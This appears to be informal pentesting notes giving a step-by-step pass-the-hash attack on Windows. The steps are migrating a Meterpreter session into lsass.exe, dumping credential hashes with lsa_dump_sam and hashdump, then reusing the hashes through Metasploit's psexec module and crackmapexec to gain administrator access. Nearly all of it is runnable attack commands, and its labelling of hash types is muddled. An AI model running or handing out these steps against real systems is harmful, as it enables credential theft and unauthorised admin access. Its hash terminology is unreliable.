First , we must aquire the NTLM and NT hashes (check the credential_dumping for more info), and these are the commands (make sure you first migrate to lsass.exe)
-migrate -N lsass.exe
NTLM hash
-lsa_dump_sam 
NT hash
-hashdump

Now, we will use psexec

-use exploit/windows/smb/psexec

We will set the SMBUser, SMBPass, and the other required options
-set SMBUser <username>
-set SMBPass <NTLMHASH:NTHASH>
AND we hit exploit and bam, admin privs babeeeeeeeeyh

We will use a different tool cause why not. Its called crackmapexec and its a post exploitation tool
-crackmapexec smb <target> -u <username> -H "<NTLM_HASH>"
